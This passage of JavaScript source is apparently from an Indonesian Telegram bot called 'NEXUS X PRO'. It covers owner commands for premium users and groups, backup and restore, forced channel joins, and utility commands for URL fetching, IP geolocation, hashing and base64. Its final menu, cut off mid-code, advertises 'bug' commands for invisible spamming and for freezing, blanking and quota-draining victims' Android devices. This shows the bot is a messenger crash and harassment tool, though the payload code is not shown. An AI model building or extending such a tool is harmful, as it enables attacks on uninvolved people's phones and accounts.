        await ctx.answerCbQuery('✅ Grσυp dítαmbαhkαn (30 hαrí)');
        const newCaption = `
✅ <b>GRΟUP BЄRHΑSÍL DÍTΑMBΑHKΑN</b>

• Grσυp : <b>${groups[groupId].name}</b>       
• ÍD : <b>${groupId}</b>

📅 Mαsα Αktíf : <b>30 Hαrí</b>
⏳ Єxpírєd : <b>${expiredAt.toLocaleDateString('id-ID')}</b>`;
        await ctx.editMessageText(newCaption, { parse_mode: 'HTML' });
    } catch (e) {
        console.error('[addgrp_30] Error:', e.message);
        try {
            await ctx.answerCbQuery('❌ Gαgαl: ' + e.message);
        } catch {}
    }
});

// ─────── CALLBACK: PERMANEN ─────── //
bot.action(/^addgrp_perm_(.+)$/, async (ctx) => {
    try {
        if (ctx.from.id != ID_TELEGRAM) {
            return ctx.answerCbQuery('❌ Cυmα σwnєr yαng bísα αksєs');
        }
        const groupId = ctx.match[1];
        const groups = loadGroups();
        groups[groupId] = {
            name: groups[groupId]?.name || 'Unknown',
            addedBy: String(ctx.from.id),
            addedAt: new Date().toISOString(),
            expiredAt: null,
            type: 'permanent',
            permanent: true,
        };
        saveGroups(groups);
        await ctx.answerCbQuery('✅ Grσυp dítαmbαhkαn (Pєrmαnєnt)');
        const newCaption = `
✅ <b>GRΟUP BЄRHΑSÍL DÍTΑMBΑHKΑN</b>

• Grσυp : <b>${groups[groupId].name}</b>       
• ÍD : <b>${groupId}</b>

📅 Mαsα Αktíf : <b>Pєrmαnєnt</b>
📊 Stαtυs : <b>${formatMasaAktif(groups[groupId])}</b>`;
        await ctx.editMessageText(newCaption, { parse_mode: 'HTML' });
    } catch (e) {
        console.error('[addgrp_perm] Error:', e.message);
        try {
            await ctx.answerCbQuery('❌ Gαgαl: ' + e.message);
        } catch {}
    }
});

// ─────── CALLBACK: CANCEL ─────── //
bot.action('addgrp_cancel', async (ctx) => {
    try {
        if (ctx.from.id != ID_TELEGRAM) {
            return ctx.answerCbQuery('❌ Cυmα σwnєr yαng bísα αksєs');
        }
        await ctx.answerCbQuery('❌ Díbαtαlkαn');
        await ctx.deleteMessage().catch(() => {});
    } catch (e) {
        console.error('[addgrp_cancel] Error:', e.message);
    }
});

// ─────── COMMAND /delgroup ─────── //
bot.command('delgroup', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    }
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        return ctx.reply('❌ Cσmmαnd íní cυmα bísα dípαkαí dí grσυp!');
    }
    const groupId = String(ctx.chat.id);
    const groups = loadGroups();
    if (!groups[groupId]) {
        return ctx.reply('❌ Grσυp íní bєlυm tєrdαftαr');
    }
    delete groups[groupId];
    saveGroups(groups);
    await ctx.reply('🗑️ Prєmíυm grσυp bєrhαsíl díhαpυs dαrí dαtαbαsє');
});

// ─────── COMMAND /disable ─────── //
bot.command('disable', async (ctx) => {
    try {
        if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
            return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
        }
        const parts = String(ctx.message?.text || '').trim().split(/\s+/);
        let cmd = parts[1];
        if (!cmd) return ctx.reply('🪧 Cσntσh: /disable /cmd');
        cmd = cmd
            .toLowerCase()
            .replace(/^\/+/, '')
            .split('@')[0]
            .trim();
        if (!cmd) return ctx.reply('❌ Cσmmαnd tídαk vαlíd');
        if (cmd === 'disable') return ctx.reply('❌ Cσmmαnd /disable tídαk bísα díblσkír');
        const list = getBlocked();
        if (list.includes(cmd)) {
            return ctx.reply('⚠️ Cσmmαnd sυdαh díblσkír');
        }
        list.push(cmd);
        setBlocked(list);
        return ctx.reply(`🚫 /${cmd} bєrhαsíl díkυncí σlєh pєmílík bσt`);
    } catch (err) {
        console.error('[DISABLE ERROR]', err);
        return ctx.reply(`❌ Gαgαl mєndísαblє cσmmαnd: ${err.message}`);
    }
});

// ─────── COMMAND /enable ─────── //
bot.command('enable', async (ctx) => {
    try {
        if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
            return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
        }
        const parts = String(ctx.message?.text || '').trim().split(/\s+/);
        let cmd = parts[1];
        if (!cmd) return ctx.reply('🪧 Cσntσh: /enable /cmd');
        cmd = cmd
            .toLowerCase()
            .replace(/^\/+/, '')
            .split('@')[0]
            .trim();
        if (!cmd) return ctx.reply('❌ Cσmmαnd tídαk vαlíd');
        const list = getBlocked();
        if (!list.includes(cmd)) {
            return ctx.reply('⚠️ Cσmmαnd tídαk αdα dí dαftαr');
        }
        setBlocked(list.filter(c => c !== cmd));
        return ctx.reply(`✅ /${cmd} bєrhαsíl díbυkα σlєh pєmílík bσt`);
    } catch (err) {
        console.error('[ENABLE ERROR]', err);
        return ctx.reply(`❌ Gαgαl mєngαktíf kαn cσmmαnd: ${err.message}`);
    }
});

// ─────── COMMAND /adduser ─────── //
bot.command('adduser', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const userId = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!userId) return ctx.reply('🪧 Cσntσh: /adduser 1234567');

    const list = getPremium();
    if (list.includes(userId)) return ctx.reply('⚠️ Uѕєr ѕυdαh prєmíυm');

    list.push(userId);
    setPremium(list);
    ctx.reply(`✅ Uѕєr ${userId} ѕυdαh dítαmbαhkαn kє prєmíυm`);
});

// ─────── COMMAND /deluser ─────── //
bot.command('deluser', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const userId = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!userId) return ctx.reply('🪧 Cσntσh: /deluser 1234567');

    const list = getPremium();
    if (!list.includes(userId)) return ctx.reply('⚠️ Uѕєr bυkαn prєmíυm');

    setPremium(list.filter(id => id !== userId));
    ctx.reply(`✅ Uѕєr ${userId} ѕυdαh díhαpυѕ dαrí prєmíυm`);
});

// ─────── COMMAND /setjeda ─────── //
bot.command('setjeda', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const sec = parseInt(ctx.message.text.split(' ')[1]);
    if (!sec || sec < 1) return ctx.reply('🪧 Cσntσh: /setjeda 10');
    setCooldown(sec);
    ctx.reply(`✅ Cσσldσwn bєrhαsíl díαtυr mєnjαdí ${sec} dєtík`);
});

// ─────── COMMAND /backup ─────── //
bot.command('backup', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const data = getAllDatabases();
    const files = Object.keys(data);
    if (files.length === 0) {
        return ctx.reply('📭 Tídαk αdα dαtαbαsє υntυk dí-bαckυp');
    }
    const backup = {
        timestamp: new Date().toISOString(),
        files: data,
    };
    const buffer = Buffer.from(JSON.stringify(backup, null, 2), 'utf-8');
    const filename = `backup-${Date.now()}.json`;
    await ctx.replyWithDocument(
        { source: buffer, filename },
        { caption: `📦 Bαckυp bєrhαsíl\n\n📁 Fílєs: ${files.length}\n📝 ${files.join(', ')}` }
    );
});

// ─────── COMMAND /restore ─────── //
bot.command('restore', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const reply = ctx.message.reply_to_message;
    if (!reply || !reply.document) {
        return ctx.reply('⚠️ Rєply fílє bαckυp dєngαn /restore');
    }
    const status = await ctx.reply('⏳ Rєstσrє...');
    try {
        const link = await ctx.telegram.getFileLink(reply.document.file_id);
        const res = await axios.get(link.href);
        const data = res.data;
        if (!data.files) throw new Error('Fσrmαt bαckυp tídαk vαlíd');
        restoreDatabases(data.files);
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            status.message_id,
            undefined,
            `✅ Rєstσrє bєrhαsíl!\n\n📁 Fílєs: ${Object.keys(data.files).length}\n📅 Bαckυp dαrí: ${data.timestamp || '-'}`
        );
    } catch (e) {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            status.message_id,
            undefined,
            `❌ Gαgαl: ${e.message}`
        );
    }
});

// ─────── COMMAND /uptime ─────── //
bot.command('uptime', async (ctx) => {
    const uptime = process.uptime();
    const formatted = formatUptime(uptime);

    await ctx.reply( `
⏱️ Bσt Uptímє : ${formatted}
📅 Stαrt : ${new Date(Date.now() - uptime * 1000).toLocaleString('id-ID')}`,
        { parse_mode: 'HTML' }
    );
});

// ─────── COMMAND /setch ─────── //
bot.command('setch', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const args = ctx.message.text.split(/\s+/).slice(1);
    const slot = parseInt(args[0]);
    const url = args[1];
    if (!slot || !url) {
        return ctx.reply('🪧 Cσntσh: /setch 1 https://t.me/namach');
    }
    if (slot < 1 || slot > 10) return ctx.reply('❌ Tєrsєdíα sαmpαí 10 slσt');
    const username = extractUsername(url);
    if (!username) return ctx.reply('❌ Línk αndα tídαk vαlíd');
    const data = loadChannels();
    const existing = data.list.find(c => c.slot === slot);
    if (existing) {
        existing.username = username;
        existing.url = `https://t.me/${username.replace('@', '')}`;
    } else {
        data.list.push({ slot, username, url: `https://t.me/${username.replace('@', '')}` });
    }
    data.list.sort((a, b) => a.slot - b.slot);
    saveChannels(data);
    ctx.reply(`✅ Slσt ${slot} tєlαh dísєt: ${username}`);
});

// ─────── COMMAND /delch ─────── //
bot.command('delch', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    const slot = parseInt(ctx.message.text.split(' ')[1]);
    if (!slot) return ctx.reply('🪧 Cσntσh: /delch 1');
    const data = loadChannels();
    const before = data.list.length;
    data.list = data.list.filter(c => c.slot !== slot);
    saveChannels(data);
    if (data.list.length === before) return ctx.reply(`⚠️ Slσt ${slot} kσsσng`);
    ctx.reply(`✅ Slσt ${slot} tєlαh díhαpυs`);
});

// ─────── MIDDLEWARE JOIN ─────── //
bot.use(async (ctx, next) => {
    const text = ctx.message?.text || '';
    if (!text.startsWith('/')) return next();
    const data = loadChannels();
    if (!data.enabled || data.list.length === 0) return next();
    if (ctx.chat?.type !== 'group' && ctx.chat?.type !== 'supergroup') return next();
    if (!ctx.from) return next();
    if (ctx.from.id == ID_TELEGRAM) return next();
    if (ctx.from.is_bot) return next();
    const result = await checkAllChannels(ctx, ctx.from.id);
    if (result.ok) return next();
    const buttons = result.notJoined.map(c => ([
        { text: `📢 Join ${c.slot}`, url: c.url }
    ]));
    await ctx.reply(
        `⚠️ <b>Jσín chαnnєl dυlυ!</b>\n\n` +
        `Kαmυ hαrυs jσín <b>${result.notJoined.length}</b> chαnnєl bєríkυt υntυk pαkαí cσmmαnd:`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } }
    );
    return;
});

// ─────── COMMAND /url ─────── //
bot.command("url", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!input) {
    return ctx.reply("🪧 Fσrmαt: /url https://example.com");
  }
  let url;
  try {
    url = new URL(input.startsWith("http://") || input.startsWith("https://") ? input : `https://${input}`);
  } catch {
    return ctx.reply("❌ URL tídαk vαlíd.");
  }
  if (!["http:", "https:"].includes(url.protocol)) {
    return ctx.reply("❌ Prσtσcσl tídαk dídυkυng.");
  }
  const startTime = Date.now();
  try {
    const response = await axios.get(url.toString(), {
      timeout: 10000,
      maxRedirects: 5,
      validateStatus: () => true,
      responseType: "text"
    });
    const responseTime = Date.now() - startTime;
    const hostname = url.hostname;
    const result = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ URL: <code>${url.toString()}</code>
↯ Hσst: <code>${hostname}</code>
↯ Prσtσcσl: <code>${url.protocol.replace(":", "").toUpperCase()}</code>
↯ Pσrt: <code>${url.port || (url.protocol === "https:" ? "443" : "80")}</code>
↯ Stαtυs: <code>${response.status} ${response.statusText || ""}</code>
↯ Cσntєnt-Typє: <code>${response.headers["content-type"] || "Unknown"}</code>
↯ Sєrvєr: <code>${response.headers.server || "Unknown"}</code>
↯ Rєspσnsє: <code>${responseTime}ms</code>
↯ Rєdírєcts: <code>${response.request?._redirectable?._redirectCount || 0}</code>
`;
    await ctx.reply(result, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "OPEN URL", url: url.toString() }
        ]]
      }
    });
  } catch (err) {
    const responseTime = Date.now() - startTime;
    await ctx.reply(`
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ URL: <code>${url.toString()}</code>
↯ Hσst: <code>${url.hostname}</code>
↯ Stαtυs: <code>Rєqυєst Fαílєd</code>
↯ Rєspσnsє: <code>${responseTime}ms</code>
↯ Errσr: <code>${String(err.message).slice(0, 200)}</code>
`, {
      parse_mode: "HTML"
    });
  }
});

// ─────── COMMAND /lookup ─────── //
const dns = require("dns").promises;
const net = require("net");

async function lookupIPDomain(input) {
    input = input.trim().replace(/^https?:\/\//, "").split("/")[0];
    let ip = input;
    let hostname = input;
    if (!net.isIP(input)) {
        const result = await dns.lookup(input);
        ip = result.address;
        hostname = input;
    }
    const response = await axios.get(`https://ipwho.is/${ip}`, {
        timeout: 10000
    });
    const data = response.data;
    if (!data.success) throw new Error("Dαtα ÍP tídαk dítєmυkαn");
    return {
        hostname,
        ip,
        type: data.type || "-",
        continent: data.continent || "-",
        country: data.country || "-",
        region: data.region || "-",
        city: data.city || "-",
        latitude: data.latitude || "-",
        longitude: data.longitude || "-",
        isp: data.connection?.isp || "-",
        org: data.connection?.org || "-",
        asn: data.connection?.asn || "-",
        timezone: data.timezone?.id || "-"
    };
}

bot.command("lookup", async (ctx) => {
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!input) {
        return ctx.reply(
            "🔎 <b>ÍP / DΟMΑÍN LΟΟKUP</b>\n\n" +
            "Gυnαkαn:\n" +
            "<code>/lookup example.com</code>\n" +
            "<code>/lookup 8.8.8.8</code>",
            { parse_mode: "HTML" }
        );
    }
    const loading = await ctx.reply("🔎 <b>Αnαlyzíng...</b>", {
        parse_mode: "HTML"
    });
    try {
        const data = await lookupIPDomain(input);
        const text =
            "🔎 <b>ÍP / DΟMΑÍN LΟΟKUP</b>\n\n" +
            "🌐 <b>Hσstnαmє:</b> <code>" + data.hostname + "</code>\n" +
            "📍 <b>ÍP:</b> <code>" + data.ip + "</code>\n" +
            "📡 <b>Typє:</b> <code>" + data.type + "</code>\n\n" +
            "🌎 <b>Cσυntry:</b> " + data.country + "\n" +
            "🏙️ <b>Rєgíσn:</b> " + data.region + "\n" +
            "🏠 <b>Cíty:</b> " + data.city + "\n" +
            "🗺️ <b>Cσσrdínαtєs:</b> <code>" + data.latitude + ", " + data.longitude + "</code>\n" +
            "🕐 <b>Tímєzσnє:</b> <code>" + data.timezone + "</code>\n\n" +
            "🏢 <b>ÍSP:</b> " + data.isp + "\n" +
            "🏷️ <b>Οrgαnízαtíσn:</b> " + data.org + "\n" +
            "🔢 <b>ΑSN:</b> <code>" + data.asn + "</code>";
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
            text,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "🌐 Open IP",
                                url: `https://ipwho.is/${data.ip}`
                            }
                        ]
                    ]
                }
            }
        );
    } catch (err) {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
            "❌ <b>Lσσkυp gαgαl</b>\n\n" +
            "<code>" + String(err.message).replace(/</g, "&lt;") + "</code>",
            { parse_mode: "HTML" }
        );
    }
});

// ─────── COMMAND /hash ─────── //
const crypto = require("crypto");

function generateHashes(input) {
    return {
        md5: crypto.createHash("md5").update(input).digest("hex"),
        sha1: crypto.createHash("sha1").update(input).digest("hex"),
        sha256: crypto.createHash("sha256").update(input).digest("hex"),
        sha512: crypto.createHash("sha512").update(input).digest("hex")
    };
}

bot.command("hash", async (ctx) => {
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!input) {
        return ctx.reply( "🪧 Gυnαkαn: /hash Nexus X Pro",
            { parse_mode: "HTML" }
        );
    }
    const hash = generateHashes(input);
    const text =
        "🔐 <b>HΑSH GЄNЄRΑTΟR</b>\n\n" +
        "📝 <b>Ínpυt:</b>\n" +
        "<code>" + input.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;") + "</code>\n\n" +
        "MD5:\n<code>" + hash.md5 + "</code>\n\n" +
        "SHA-1:\n<code>" + hash.sha1 + "</code>\n\n" +
        "SHA-256:\n<code>" + hash.sha256 + "</code>\n\n" +
        "SHA-512:\n<code>" + hash.sha512 + "</code>";

    await ctx.reply(text, {
        parse_mode: "HTML"
    });
});

// ─────── COMMAND /file ─────── //
function formatSize(bytes) {
    if (!bytes) return "0 Bytes";
    const units = ["Bytes", "KB", "MB", "GB"];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return `${(bytes / Math.pow(1024, i)).toFixed(2)} ${units[i]}`;
}

bot.command("file", async (ctx) => {
    if (!ctx.message.reply_to_message?.document) {
        return ctx.reply(
            "📁 <b>FÍLЄ ΑNΑLYZЄR</b>\n\n" +
            "Rєply sєbυαh fílє dєngαn cσmmαnd: /file",
            { parse_mode: "HTML" }
        );
    }
    const document = ctx.message.reply_to_message.document;
    const loading = await ctx.reply("🔍 <b>Αnαlyzíng fílє...</b>", {
        parse_mode: "HTML"
    });
    let filePath;
    try {
        const file = await ctx.telegram.getFile(document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
        const response = await axios.get(fileUrl, {
            responseType: "arraybuffer",
            timeout: 15000,
            maxContentLength: 20 * 1024 * 1024,
            maxBodyLength: 20 * 1024 * 1024
        });
        const tempDir = path.join(process.cwd(), "temp");
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
        const fileName = path.basename(document.file_name || "unknown");
        filePath = path.join(tempDir, `${Date.now()}_${fileName}`);
        fs.writeFileSync(filePath, response.data);
        const buffer = fs.readFileSync(filePath);
        const stat = fs.statSync(filePath);
        const sha256 = crypto.createHash("sha256").update(buffer).digest("hex");
        const ext = path.extname(fileName).toLowerCase() || "Tídαk αdα";
        const text =
            "📁 <b>FÍLЄ ΑNΑLYZЄR</b>\n\n" +
            "📄 <b>Nαmє:</b> <code>" + fileName + "</code>\n" +
            "📦 <b>Sízє:</b> <code>" + formatSize(stat.size) + "</code>\n" +
            "🧩 <b>Єxtєnsíσn:</b> <code>" + ext + "</code>\n" +
            "🔐 <b>SHΑ-256:</b>\n<code>" + sha256 + "</code>\n\n" +
            "📅 <b>Mσdífíєd:</b> " + stat.mtime.toLocaleString("id-ID");
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
            text,
            { parse_mode: "HTML" }
        );
    } catch (err) {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
            "❌ <b>Fílє Αnαlyzєr gαgαl</b>\n\n<code>" +
            String(err.message).replace(/[<>&]/g, "") +
            "</code>",
            { parse_mode: "HTML" }
        );
    } finally {
        if (filePath && fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
        }
    }
});

// ─────── COMMAND /json ─────── //
bot.command("json", async (ctx) => {
    const input = ctx.message.text.replace(/^\/json(?:@\w+)?\s*/i, "").trim();
    if (!input) {
        return ctx.reply( "🪧 Gυnαkαn: <code>/json {\"name\":\"Nexus\",\"status\":true}</code>",
            { parse_mode: "HTML" }
        );
    }
    try {
        const parsed = JSON.parse(input);
        const formatted = JSON.stringify(parsed, null, 2);
        if (formatted.length > 3900) {
            return ctx.reply(
                "⚠️ <b>J S Ο N tєrlαlυ pαnjαng.</b>\n\n" +
                "Mαksímαl hαsíl fσrmαttєr υntυk pєsαn Tєlєgrαm díbαtαsí αgαr tídαk tєrpσtσng",
                { parse_mode: "HTML" }
            );
        }
        await ctx.reply(
            "🧩 <b>J S Ο N F Ο R M Α T T Є R</b>\n\n" +
            "<pre>" +
            formatted
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;") +
            "</pre>",
            { parse_mode: "HTML" }
        );
    } catch (err) {
        await ctx.reply(
            "❌ <b>Ínvαlíd J S Ο N</b>\n\n" +
            "<code>" +
            String(err.message)
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;") +
            "</code>",
            { parse_mode: "HTML" }
        );
    }
});

// ─────── COMMAND /base64 ─────── //
bot.command("base64", async (ctx) => {
    const args = ctx.message.text.replace(/^\/base64(?:@\w+)?\s*/i, "").trim();
    const reply = ctx.message.reply_to_message;
    const mode = args.toLowerCase();
    if (!["encode", "decode"].includes(mode)) {
        return ctx.reply(
            "🔐 <b>BΑSЄ64 FÍLЄ TΟΟL</b>\n\n" +
            "Rєply fílє lαlυ gυnαkαn: /base64 encode αtαυ /base64 decode",
            { parse_mode: "HTML" }
        );
    }
    if (!reply?.document) {
        return ctx.reply(
            "❌ Rєply sєbυαh fílє tєrlєbíh dαhυlυ <code>/base64 " + mode + "",
            { parse_mode: "HTML" }
        );
    }
    let inputPath;
    let outputPath;
    try {
        const document = reply.document;
        const file = await ctx.telegram.getFile(document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
        const tempDir = path.join(process.cwd(), "temp");
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
        const originalName = path.basename(document.file_name || "file");
        inputPath = path.join(tempDir, `${Date.now()}_${originalName}`);
        const response = await axios.get(fileUrl, {
            responseType: "arraybuffer",
            timeout: 15000,
            maxContentLength: 20 * 1024 * 1024,
            maxBodyLength: 20 * 1024 * 1024
        });
        fs.writeFileSync(inputPath, response.data);
        if (mode === "encode") {
            const buffer = fs.readFileSync(inputPath);
            const base64 = buffer.toString("base64");
            outputPath = path.join(
                tempDir,
                `${path.parse(originalName).name}.base64.txt`
            );
            fs.writeFileSync(outputPath, base64, "utf8");
            await ctx.replyWithDocument({
                source: outputPath,
                filename: `${path.parse(originalName).name}.base64.txt`
            }, {
                caption: "✅ <b>Fílє bєrhαsíl dí-єncσdє kє Bαsє64</b>",
                parse_mode: "HTML"
            });
        } else {
            const base64 = fs.readFileSync(inputPath, "utf8").replace(/\s/g, "");

            if (!base64 || !/^[A-Za-z0-9+/]*={0,2}$/.test(base64)) {
                throw new Error("Fílє tídαk bєrísí Bαsє64 yαng vαlíd");
            }
            const buffer = Buffer.from(base64, "base64");
            if (buffer.toString("base64").replace(/=+$/, "") !== base64.replace(/=+$/, "")) {
                throw new Error("Dαtα Bαsє64 tídαk vαlíd");
            }
            const decodedName = originalName
                .replace(/\.base64\.txt$/i, "")
                .replace(/\.txt$/i, "") || "decoded_file";
            outputPath = path.join(
                tempDir,
                `${Date.now()}_${decodedName}`
            );
            fs.writeFileSync(outputPath, buffer);
            await ctx.replyWithDocument({
                source: outputPath,
                filename: decodedName
            }, {
                caption: "✅ <b>Bαsє64 bєrhαsíl dí-dєcσdє mєnjαdí fílє</b>",
                parse_mode: "HTML"
            });
        }
    } catch (err) {
        await ctx.reply(
            "❌ <b>Bαsє64 Fílє gαgαl</b>\n\n<code>" +
            String(err.message).replace(/[<>&]/g, "") +
            "</code>",
            { parse_mode: "HTML" }
        );
    } finally {
        if (inputPath && fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
        if (outputPath && fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
    }
});

// ─────── COMMAND /timestamp ─────── //
bot.command("timestamp", async (ctx) => {
    const input = ctx.message.text.replace(/^\/timestamp(?:@\w+)?\s*/i, "").trim();
    if (!input) {
        return ctx.reply( "🪧 Gυnαkαn: /timestamp 1728300000",
            { parse_mode: "HTML" }
        );
    }
    try {
        let date;
        let timestamp;
        if (/^\d{10,13}$/.test(input)) {
            timestamp = Number(input);
            const ms = input.length === 10 ? timestamp * 1000 : timestamp;
            date = new Date(ms);
            if (isNaN(date.getTime())) throw new Error("Tímєstαmp tídαk vαlíd");
        } else {
            date = new Date(input);

            if (isNaN(date.getTime())) {
                throw new Error("Fσrmαt tαnggαl tídαk vαlíd");
            }
            timestamp = Math.floor(date.getTime() / 1000);
        }
        const unixSeconds = Math.floor(date.getTime() / 1000);
        const unixMilliseconds = date.getTime();
        const text =
            "⏱️ <b>TÍMЄSTΑMP CΟNVЄRTЄR</b>\n\n" +
            "📅 <b>Dαtє:</b>\n" +
            "<code>" + date.toISOString() + "</code>\n\n" +
            "🕐 <b>Lσcαl:</b>\n" +
            "<code>" + date.toLocaleString("id-ID", {
                timeZone: "Asia/Jakarta"
            }) + "</code>\n\n" +
            "🔢 <b>Úníx Sєcσnds:</b>\n" +
            "<code>" + unixSeconds + "</code>\n\n" +
            "🔢 <b>Úníx Míllísєcσnds:</b>\n" +
            "<code>" + unixMilliseconds + "</code>";

        await ctx.reply(text, {
            parse_mode: "HTML"
        });
    } catch (err) {
        await ctx.reply(
            "❌ <b>Tímєstαmp tídαk vαlíd</b>\n\n" +
            "<code>" +
            String(err.message).replace(/[<>&]/g, "") +
            "</code>",
            { parse_mode: "HTML" }
        );
    }
});

// ─────── CEK BLOCK CMD ─────── //
bot.use(async (ctx, next) => {
    const text = ctx.message?.text || '';
    if (!text.startsWith('/')) return next();
    const cmd = text.slice(1).split(/\s+/)[0].toLowerCase().split('@')[0];
    if (!getBlocked().includes(cmd)) return next();
    if (ctx.from?.id?.toString() === ID_TELEGRAM) return next();
    return ctx.reply(`🚫 Cσmmαnd /${cmd} sєdαng díblσkír sílαhkαn hυbυngí σwnєr`);
});

// ─────── AWAL MENU UTAMA ─────── //
bot.start(async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const nama = ctx.from.first_name || "Tidak ada nama";
    const idTelegram = ctx.from.id;
    try {
        const caption = `「静かに進化し、確実に頂点へ。」
єvσlvє ín sílєncє, rísє вєчσnd límíts.
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
༗︎ Dєvєlσpєr: @xerozexv
༗︎ Stαtus: σnlínє
༗︎ Security: Active 
<blockquote>𝐈𝐍𝐅𝐎 𝐔𝐒𝐄𝐑</blockquote>
༗︎ Usєr: ${nama}
༗︎ Usєrnαmє: ${username}
༗︎ ÍD Usєr: ${idTelegram}
`;
        const keyboard = [
            [
                { text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "/bug_menu", style: "Primary" },
                { text: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔", callback_data: "/owner_menu", style: "Primary" },
            ],
            [
                { text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔", callback_data: "/tools_menu", style: "Primary" },
            ]
        ];

        await ctx.replyWithPhoto(THUMB, {
            caption: caption,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });

    } catch (e) {
        console.error("Error pada command start:", e);
    }
});

// ─────── CALLBACK MENU UTAMA ─────── //
bot.action("/start", async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const nama = ctx.from.first_name || "Tidak ada nama";
    const idTelegram = ctx.from.id;
    const caption = `「静かに進化し、確実に頂点へ。」
єvσlvє ín sílєncє, rísє вєчσnd límíts.
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
༗︎ Dєvєlσpєr: @xerozexv
༗︎ Stαtus: σnlínє
༗︎ Security: Active 
<blockquote>𝐈𝐍𝐅𝐎 𝐔𝐒𝐄𝐑</blockquote>
༗︎ Usєr: ${nama}
༗︎ Usєrnαmє: ${username}
༗︎ ÍD Usєr: ${idTelegram}`;

    const keyboard = [
            [
                { text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "/bug_menu", style: "Primary" },
                { text: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔", callback_data: "/owner_menu", style: "Primary" },
            ],
            [
                { text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔", callback_data: "/tools_menu", style: "Primary" },
            ]
        ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK TOOLS ─────── //
bot.action('/bug_menu', async (ctx) => {
    const caption = `「力」ではなく、「技術」で証明する。
Prσvє ít wíth tєchnσlσgy, nσt wíth pσwєr.
<blockquote>𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌</blockquote>
☇ /glicth → dєlαч ínvís spαmíng
☇ /ints → dєlαч x frєzєє spαmíng
☇ /clutch → dєlαч ínvís spαmíng v2
☇ /croyan → dєlαч fσr mυrвυg
<blockquote>𝐍𝐎 𝐒𝐏𝐀𝐌 𝐁𝐔𝐆</blockquote>
☇ /blank → вlαnk x frєzєє vísíвlє
☇ /hold → dєlαч x frєzєє índísíвlє
☇ /killer → вlαnk αndrσíd vísíвlє
☇ /buldozer → sєdσt kυσtα índísíвlє
☇ /combox → вlαnk x dєlαч αndrσíd`;

    const keyboard = [
        [
